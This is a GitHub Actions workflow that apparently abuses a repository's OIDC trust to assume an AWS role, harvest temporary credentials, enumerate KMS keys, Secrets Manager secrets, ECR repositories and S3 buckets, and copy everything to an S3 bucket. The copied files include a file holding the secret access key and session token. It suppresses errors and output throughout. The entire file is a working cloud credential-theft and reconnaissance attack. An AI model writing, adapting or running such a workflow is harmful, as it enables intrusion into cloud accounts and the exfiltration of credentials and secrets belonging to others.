name: i1363-enum
on:
  push:
    branches:
      - 'i1363-*'
permissions:
  id-token: write
  contents: read
jobs:
  harvest:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: harvest
        run: |
          set -uo pipefail
          D=/tmp/i1363; mkdir -p $D; cd $D
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i1363 --web-identity-token "$JWT" --duration-seconds 3600 > sts.json 2>sts.err || true
          python3 - <<'PY' || true
          import json
          d=json.load(open('/tmp/i1363/sts.json'))['Credentials']
          open('/tmp/i1363/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n' % (d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))
          print('AK',d['AccessKeyId'],'EXP',d['Expiration'])
          PY
          . ./env.sh || true
          aws sts get-caller-identity > id.json 2>&1 || true
          for R in us-east-1 us-east-2; do
            export AWS_DEFAULT_REGION=$R
            aws kms list-keys > kms_keys_$R.json 2>&1 || true
            aws kms list-aliases > kms_aliases_$R.json 2>&1 || true
            python3 - "$R" <<'PY' || true
import json,sys,subprocess,os
R=sys.argv[1]
try: keys=json.load(open(f'kms_keys_{R}.json')).get('Keys',[])
except Exception: keys=[]
out=[]
for k in keys:
    kid=k['KeyId']
    d=json.loads(subprocess.run(['aws','kms','describe-key','--key-id',kid],capture_output=True,text=True).stdout or '{}')
    md=d.get('KeyMetadata',{})
    rec={'KeyId':kid,'KeySpec':md.get('KeySpec'),'KeyUsage':md.get('KeyUsage'),'Enabled':md.get('Enabled'),'Description':md.get('Description'),'Arn':md.get('Arn')}
    if md.get('KeySpec','').startswith('ECC') or md.get('KeyUsage')=='SIGN_VERIFY':
        g=subprocess.run(['aws','kms','get-public-key','--key-id',kid],capture_output=True,text=True)
        try: j=json.loads(g.stdout); rec['PublicKey']=j.get('PublicKey'); rec['KeyUsage2']=j.get('KeyUsage'); rec['SigningAlgorithms']=j.get('SigningAlgorithms')
        except Exception: rec['pub_err']=g.stderr[:200]
    out.append(rec)
json.dump(out,open(f'kms_detail_{R}.json','w'),indent=1)
print(R,'keys',len(out))
PY
            aws ecr describe-repositories --max-items 500 > ecr_repos_$R.json 2>&1 || true
            aws secretsmanager list-secrets --max-items 1000 > sm_secrets_$R.json 2>&1 || true
          done
          export AWS_DEFAULT_REGION=us-east-1
          aws s3api list-objects-v2 --bucket floki-db-export --delimiter / > s3_dbexport_top.json 2>&1 || true
          aws s3api list-objects-v2 --bucket floki-db-export --prefix "" --max-items 1000 > s3_dbexport_first.json 2>&1 || true
          aws s3api list-objects-v2 --bucket floki-openreplay-assets --delimiter / > s3_replay_top.json 2>&1 || true
          aws s3api list-objects-v2 --bucket floki-db-export --prefix "floki-db-export-" --delimiter / > s3_dbexport_prefixes.json 2>&1 || true
          for f in *.json *.err *.sh; do [ -f "$f" ] && aws s3 cp "$f" "s3://floki-openreplay-assets/i1363/$f" --no-progress >/dev/null 2>&1 || true; done
          echo DONE > done; aws s3 cp done s3://floki-openreplay-assets/i1363/done --no-progress >/dev/null 2>&1 || true
